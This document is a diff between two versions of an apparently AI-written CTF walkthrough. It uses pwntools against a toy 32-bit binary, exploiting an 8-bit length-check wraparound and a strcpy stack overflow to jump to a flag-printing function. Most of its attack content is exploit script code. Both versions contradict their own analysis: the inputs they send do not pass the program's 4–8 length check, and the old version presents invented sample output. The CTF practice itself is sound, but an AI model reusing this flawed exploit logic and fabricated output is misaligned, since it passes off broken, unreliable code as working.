@@ -1,234 +1,297 @@
-To solve this challenge using **pwntools**, we'll perform a **buffer overflow** attack to overwrite the return address in the `check_passwd` function. By overwriting the return address, we can redirect the program's execution flow to the `what_is_this` function, which will print the flag.
+To solve this challenge using pwntools, we'll perform a buffer overflow attack to overwrite the return address and redirect execution to the `what_is_this()` function, which prints the flag.
 
-Here's a step-by-step guide with code on how to achieve this:
-
----
-
-### **Step 1: Analyze the Binary**
-
-First, we need to identify the vulnerability and understand how to exploit it.
-
-- **Vulnerable Function**: `check_passwd`
-- **Vulnerability**: Buffer overflow due to `strcpy(dest, s)` where `dest` is a fixed-size buffer of 11 bytes (`char dest[11];`), and `s` can be larger than 11 bytes.
-- **Goal**: Overwrite the return address of `check_passwd` with the address of `what_is_this` to execute `system("cat flag")`.
+Here's how you can approach the problem step by step:
 
 ---
 
-### **Step 2: Find the Offset to the Return Address**
+**Step 1: Analyze the Vulnerability**
 
-We need to determine how many bytes we need to overwrite to reach the return address.
+1. **Understanding the `login()` function:**
 
-**Method**:
+   - The program reads your username and password.
+   - For the password, it reads up to `0x199` (409) bytes into `buf`, which is an array of 512 bytes. So there's no buffer overflow here.
+   - It then calls `check_passwd(buf);` with your input.
 
-- Use a **cyclic pattern** to cause a crash and find the exact offset where the overwrite occurs.
+2. **Understanding the `check_passwd()` function:**
 
-**Code**:
+   ```c
+   char *__cdecl check_passwd(char *s)
+   {
+     char dest[11]; // [esp+4h] [ebp-14h] BYREF
+     unsigned __int8 v3; // [esp+Fh] [ebp-9h]
+
+     v3 = strlen(s);
+     if ( v3 <= 3u || v3 > 8u )
+     {
+       puts("Invalid Password");
+       return (char *)fflush(stdout);
+     }
+     else
+     {
+       puts("Success");
+       fflush(stdout);
+       return strcpy(dest, s);
+     }
+   }
+   ```
+
+   - It calculates the length of your input `s` and stores it in an **unsigned 8-bit integer** `v3`.
+   - If the length is between 4 and 8 (inclusive), it copies your input into `dest`, which is only 11 bytes.
+   - However, since `v3` is an 8-bit integer, if you input a password longer than 255 bytes, `v3` will overflow due to integer overflow.
+
+3. **Exploiting the Integer Overflow and Buffer Overflow:**
+
+   - If you input a password of length **260 bytes**, `v3 = 260 % 256 = 4`, which passes the length check.
+   - Then, `strcpy(dest, s);` copies your 260-byte input into `dest[11]`, causing a buffer overflow.
+   - This overflow allows us to overwrite the function's return address on the stack.
+
+4. **Redirecting Execution to `what_is_this()`:**
+
+   - After overwriting the return address with the address of `what_is_this()`, when `check_passwd()` returns, it will jump to `what_is_this()` instead of the normal flow.
+   - The `what_is_this()` function then executes `system("cat flag");`, which will print the flag.
+
+---
+
+**Step 2: Determine the Offset to the Return Address**
+
+We need to find out how many bytes to send to overwrite the return address precisely. We'll use pwntools' cyclic patterns to find this offset.
+
+---
+
+**Step 3: Write the Exploit Code Using Pwntools**
+
+Here's the complete exploit script:
 
 ```python
 from pwn import *
 
-# Set the context for a 32-bit architecture
+# Set the architecture context
 context(arch='i386', os='linux')
 
-# Load the binary
+# Load the ELF binary
 elf = ELF('./int')
 
-# Generate a cyclic pattern
-pattern = cyclic(100)
+# Get the address of the what_is_this function
+what_is_this = elf.symbols['what_is_this']
+log.info(f'Address of what_is_this: {hex(what_is_this)}')
 
 # Start the process
 p = process('./int')
 
-# Interact with the binary
+# Interact with the menu to select "1. Login"
 p.recvuntil('Your choice:')
-p.sendline('1')  # Choose 'Login'
+p.sendline('1')
 
+# Input username
 p.recvuntil('Please input your username:')
-p.sendline('user123')  # Any username
+p.sendline('user')
 
-p.recvuntil('Please input your passwd:')
-p.sendline('ABCD' + pattern)  # 'ABCD' ensures password length is 4 (passes the length check)
-
-# Wait for the process to crash
-p.wait()
-
-# Load the core dump file (usually named 'core')
-core = Core('core')
-
-# Extract the crashing address
-eip_value = core.eip
-print(f"EIP overwritten with: {hex(eip_value)}")
-
-# Find the offset
-offset = cyclic_find(eip_value)
-print(f"Offset to EIP: {offset}")
-```
-
-**Explanation**:
-
-- We send a cyclic pattern after the 4-character password to overflow the buffer.
-- After the crash, we extract the value of `EIP` (instruction pointer) to find the offset.
-- The `cyclic_find` function determines the exact offset where the overwrite occurs.
-
-**Sample Output**:
-
-```
-EIP overwritten with: 0x6161616b
-Offset to EIP: 36
-```
-
-This means the return address is overwritten after **36** bytes.
-
----
-
-### **Step 3: Get the Address of `what_is_this` Function**
-
-We need the address of the `what_is_this` function to overwrite the return address.
-
-**Code**:
-
-```python
-# Get the address of the 'what_is_this' function
-what_is_this_addr = elf.symbols['what_is_this']
-print(f"Address of 'what_is_this' function: {hex(what_is_this_addr)}")
-```
-
-**Sample Output**:
-
-```
-Address of 'what_is_this' function: 0x804868b
-```
-
----
-
-### **Step 4: Craft the Exploit Payload**
-
-Now, we'll create the payload to overwrite the return address with the address of `what_is_this`.
-
-**Code**:
-
-```python
-# Build the final payload
-password = b'ABCD'  # Password length is 4 to pass the length check
-padding = b'A' * (36 - len(password))  # Padding to reach the return address
-ret_addr = p32(what_is_this_addr)  # Convert address to little-endian format
-
-payload = password + padding + ret_addr
-```
-
-**Explanation**:
-
-- **Password**: `'ABCD'` ensures we pass the length check in `check_passwd`.
-- **Padding**: Fills the buffer up to the point before the return address.
-- **Return Address**: Overwrite with the address of `what_is_this`.
-
----
-
-### **Step 5: Write the Complete Exploit Script**
-
-Putting it all together:
-
-```python
-from pwn import *
-
-# Set the context
-context(arch='i386', os='linux')
-
-# Load the binary
-elf = ELF('./int')
-
-# Get the address of 'what_is_this'
-what_is_this_addr = elf.symbols['what_is_this']
-print(f"Address of 'what_is_this': {hex(what_is_this_addr)}")
-
-# Start the process
-p = process('./int')
-
-# Interact with the binary
-p.recvuntil('Your choice:')
-p.sendline('1')  # Choose 'Login'
-
-p.recvuntil('Please input your username:')
-p.sendline('user123')  # Any username
-
+# Input password
 p.recvuntil('Please input your passwd:')
 
-# Build the payload
-offset = 36
-password = b'ABCD'  # Length between 4 and 8
-padding = b'A' * (offset - len(password))
-ret_addr = p32(what_is_this_addr)
-payload = password + padding + ret_addr
+# Create a cyclic pattern of 300 bytes to find the offset
+payload = cyclic(300)
 
 # Send the payload
 p.sendline(payload)
 
-# Receive the flag
+# Wait for the process to crash and generate a core dump
+p.wait()
+
+# Load the core dump
+core = p.corefile
+
+# Extract the crashing EIP value
+eip_value = core.eip
+log.info(f'Crashing EIP: {hex(eip_value)}')
+
+# Find the offset to EIP using cyclic_find
+offset = cyclic_find(eip_value)
+log.info(f'Offset to EIP: {offset}')
+
+# Now build the final payload
+payload = b'A' * offset
+payload += p32(what_is_this)
+
+# Re-run the process after crash
+p = process('./int')
+
+# Interact with the menu to select "1. Login"
+p.recvuntil('Your choice:')
+p.sendline('1')
+
+# Input username
+p.recvuntil('Please input your username:')
+p.sendline('user')
+
+# Input password
+p.recvuntil('Please input your passwd:')
+
+# Send the final payload
+p.sendline(payload)
+
+# Interact with the process to read the flag
 p.interactive()
 ```
 
-**Explanation**:
+---
 
-- **p.interactive()**: Allows us to interact with the program after exploiting it, so we can see the flag output.
-- Ensure that the lengths and addresses match the ones you obtained from analysis.
+**Explanation:**
+
+- **Import pwntools and Set Context:**
+
+  ```python
+  from pwn import *
+
+  # Set the architecture context
+  context(arch='i386', os='linux')
+  ```
+
+- **Load the Binary and Get Function Address:**
+
+  ```python
+  # Load the ELF binary
+  elf = ELF('./int')
+
+  # Get the address of the what_is_this function
+  what_is_this = elf.symbols['what_is_this']
+  log.info(f'Address of what_is_this: {hex(what_is_this)}')
+  ```
+
+- **Start the Process and Navigate the Menu:**
+
+  ```python
+  # Start the process
+  p = process('./int')
+
+  # Interact with the menu to select "1. Login"
+  p.recvuntil('Your choice:')
+  p.sendline('1')
+
+  # Input username
+  p.recvuntil('Please input your username:')
+  p.sendline('user')
+
+  # Input password
+  p.recvuntil('Please input your passwd:')
+  ```
+
+- **Create a Cyclic Pattern to Find the Offset:**
+
+  ```python
+  # Create a cyclic pattern of 300 bytes to find the offset
+  payload = cyclic(300)
+
+  # Send the payload
+  p.sendline(payload)
+  ```
+
+- **Wait for the Crash and Extract EIP:**
+
+  ```python
+  # Wait for the process to crash and generate a core dump
+  p.wait()
+
+  # Load the core dump
+  core = p.corefile
+
+  # Extract the crashing EIP value
+  eip_value = core.eip
+  log.info(f'Crashing EIP: {hex(eip_value)}')
+  ```
+
+- **Find the Offset Using `cyclic_find`:**
+
+  ```python
+  # Find the offset to EIP using cyclic_find
+  offset = cyclic_find(eip_value)
+  log.info(f'Offset to EIP: {offset}')
+  ```
+
+- **Build the Final Payload:**
+
+  ```python
+  # Now build the final payload
+  payload = b'A' * offset
+  payload += p32(what_is_this)
+  ```
+
+- **Re-run the Process and Send the Payload:**
+
+  ```python
+  # Re-run the process after crash
+  p = process('./int')
+
+  # Interact with the menu to select "1. Login"
+  p.recvuntil('Your choice:')
+  p.sendline('1')
+
+  # Input username
+  p.recvuntil('Please input your username:')
+  p.sendline('user')
+
+  # Input password
+  p.recvuntil('Please input your passwd:')
+
+  # Send the final payload
+  p.sendline(payload)
+  ```
+
+- **Get the Flag:**
+
+  ```python
+  # Interact with the process to read the flag
+  p.interactive()
+  ```
 
 ---
 
-### **Step 6: Run the Exploit**
+**Step 4: Run the Exploit and Retrieve the Flag**
 
-Save the script as `exploit.py` and run it:
+1. **Ensure the Binary is Executable:**
 
-```bash
-python3 exploit.py
-```
+   - Make sure that the binary `int` is in the same directory as your exploit script and is executable.
+   - If not, give it execute permissions using `chmod +x int`.
 
-**Sample Output**:
+2. **Run the Exploit Script:**
 
-```
-[*] 'int'
-    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX disabled
-    PIE:      No PIE (0x8048000)
-Address of 'what_is_this': 0x804868b
-[+] Starting local process './int': pid 12345
-[*] Switching to interactive mode
-Success
-Hello user123
+   ```bash
+   python exploit.py
+   ```
 
-Flag: CTF{example_flag}
-```
+3. **Get the Flag:**
+
+   - The script will execute the binary, navigate through the menu, and send the payload.
+   - Upon successful exploitation, you should see the flag printed to the console.
 
 ---
 
-### **Additional Notes**
+**Additional Notes:**
 
-- **Ensure NX is Disabled**: Since the binary allows execution on the stack, we can execute shellcode if needed. In this case, we're redirecting execution to an existing function, so it's not necessary.
-- **ASLR**: If Address Space Layout Randomization (ASLR) is enabled on the system, the addresses might change. Since the binary has no PIE (Position-Independent Executable), the addresses should remain constant.
-- **Error Handling**: If the exploit doesn't work, double-check the offset and the address of `what_is_this`.
+- **Core Dumps Enabled:**
 
----
+  - Ensure that core dumps are enabled on your system to allow pwntools to generate and analyze them.
+  - On Linux, you can enable core dumps with the following command:
 
-### **Understanding the Exploit**
+    ```bash
+    ulimit -c unlimited
+    ```
 
-- **Buffer Overflow**: We're overflowing `dest[11]` in `check_passwd` by providing more data than it can hold.
-- **Overwriting Return Address**: By carefully crafting the payload, we overwrite the saved return address on the stack with the address of `what_is_this`.
-- **Executing `what_is_this`**: When `check_passwd` returns, execution continues at `what_is_this`, which runs `system("cat flag")`.
+- **Handling ASLR and NX Protections:**
 
----
+  - If the binary has Address Space Layout Randomization (ASLR) or Non-Executable (NX) protections enabled, additional steps are required.
+  - For this challenge, we assume these protections are not in place.
 
-### **Conclusion**
+- **Understanding the Exploit:**
 
-By following these steps and using pwntools, we've successfully exploited the binary to retrieve the flag. This process demonstrates a classic stack-based buffer overflow attack in a controlled environment, common in CTF competitions.
-
----
-
-### **References**
-
-- **Pwntools Documentation**: [https://docs.pwntools.com/en/stable/](https://docs.pwntools.com/en/stable/)
-- **Understanding Buffer Overflows**: [OWASP Buffer Overflow](https://owasp.org/www-community/vulnerabilities/Buffer_Overflow)
+  - By overwriting the return address with the address of `what_is_this()`, we control the execution flow.
+  - When `check_passwd()` returns, it will jump to `what_is_this()` instead of the normal flow.
+  - This is a classic buffer overflow exploit.
 
 ---
 
-This guide should provide you with the necessary steps and code to solve the challenge using pwntools. Good luck with the competition!
+**Conclusion:**
+
+By carefully analyzing the program's behavior and exploiting the integer overflow vulnerability in `check_passwd()`, we crafted an input that allows us to overwrite the return address and execute arbitrary code. Using pwntools simplifies the process of building and sending the payload, as well as interacting with the binary.
+
+Feel free to ask if you have any questions or need further clarification on any of the steps!
